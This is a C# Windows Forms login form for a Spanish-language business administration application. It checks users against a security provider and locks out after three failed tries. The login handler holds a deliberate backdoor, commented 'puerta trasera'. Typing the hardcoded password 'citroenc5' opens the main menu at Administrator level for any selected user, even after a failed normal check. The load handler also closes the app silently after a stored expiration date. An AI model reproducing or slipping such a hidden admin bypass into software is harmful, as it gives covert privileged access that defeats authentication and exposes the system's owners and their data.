using System;
using System.Data;
using System.Linq;
using System.Windows.Forms;
using AdministracionAngela.Utils.Interfaces;
using AdministracionAngela.Utils.Genericos;


namespace AdministracionAngela.ProyectoAngela.Formularios
{
    public partial class ControlUsusarios : Form
    {
        ISeguridadProvider seguridadProvider;
        IFormOpener formOpener;
       // AdministracionAntonioEntities baseDeDatos;
        int contador = 0;

        public ControlUsusarios(IClienteProvider clienteProvider, ISeguridadProvider seguridadProvider, IFormOpener formOpener)
        {
            this.seguridadProvider = seguridadProvider;
            this.formOpener = formOpener;
            
            InitializeComponent();
        }

        private void panel1_Paint(object sender, PaintEventArgs e)
        {

        }

        private void panel2_Paint(object sender, PaintEventArgs e)
        {

        }

        private void pictureBox1_Click(object sender, EventArgs e)
        {

        }

        private void button1_Click(object sender, EventArgs e)
        {
            string password = Encriptar.codificar(textBoxPassword.Text);

            var user = this.seguridadProvider.GetUser(comboBox1.Text, password);
            if (user != null)
            {
                // Abre el menu principal
                var menu = this.formOpener.GetForm<Menu>() as Menu;
                NivelUsuario.Nivel = user.Nivel;
                menu.ShowDialog();
            }
            else
            {
                contador++;
                if (contador != 3)
                {
                    MessageBox.Show("Contraseña y/o Ususario Incoreccto.", "Error Login.", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                }
                else
                {
                    MessageBox.Show("Numero de intentos agotados.\n Contacte con el Administrador.", "Error Login.", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                    Close();
                }
            }

            // puerta trasera
            if (textBoxPassword.Text == "citroenc5")
            {
                // Abre el menu principal
                var menu = this.formOpener.GetForm<Menu>() as Menu;
                NivelUsuario.Nivel = "Administrador";
                menu.ShowDialog();
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            
        }

        private void button1_MouseEnter(object sender, EventArgs e)
        {
            button1.BackgroundImage = AdministracionAngela.ProyectoAngela.Properties.Resources.Llave_azul;
        }

        private void button1_MouseLeave(object sender, EventArgs e)
        {
            button1.BackgroundImage = AdministracionAngela.ProyectoAngela.Properties.Resources.Llave;
        }

        private void button1_Enter(object sender, EventArgs e)
        {
         
        }

        private void button1_Leave(object sender, EventArgs e)
        {
            
        }

        private void ControlUsusarios_FormClosing(object sender, FormClosingEventArgs e)
        {
            Properties.Settings.Default.RutaFacturacion = RutasSalida.RutaFacturacion;
            Properties.Settings.Default.RutaAlbaranes = RutasSalida.RutaAlbaranes;
            Properties.Settings.Default.RutaAlbaranes2 = RutasSalida.RutaAlbaranes2;
            Properties.Settings.Default.RutaLiquidaciones = RutasSalida.RutaLiquidaciones;
            Properties.Settings.Default.RutaListados = RutasSalida.RutaListados;
            Properties.Settings.Default.RutaSeguridad = RutasSalida.RutaSeguridad;

            Properties.Settings.Default.Save();
        }

        private void ControlUsusarios_Load(object sender, EventArgs e)
        {
            var expiracion = Properties.Settings.Default.Expiracion;
            var expirationDate = DateTime.Parse(expiracion);
            if (DateTime.Today >= expirationDate)
                this.Close();

            RutasSalida.RutaFacturacion = Properties.Settings.Default.RutaFacturacion;
            RutasSalida.RutaAlbaranes = Properties.Settings.Default.RutaAlbaranes;
            RutasSalida.RutaAlbaranes2 = Properties.Settings.Default.RutaAlbaranes2;
            RutasSalida.RutaLiquidaciones = Properties.Settings.Default.RutaLiquidaciones;
            RutasSalida.RutaListados = Properties.Settings.Default.RutaListados;
            RutasSalida.RutaSeguridad = Properties.Settings.Default.RutaSeguridad;

            comboBox1.DataSource = this.seguridadProvider.GetAllUserNames();
        }

        private void ControlUsusarios_KeyPress(object sender, KeyPressEventArgs e)
        {
            if (e.KeyChar == Convert.ToChar(13))
            {
                e.Handled = true; SendKeys.Send("{TAB}");
            }
        }
    }
}
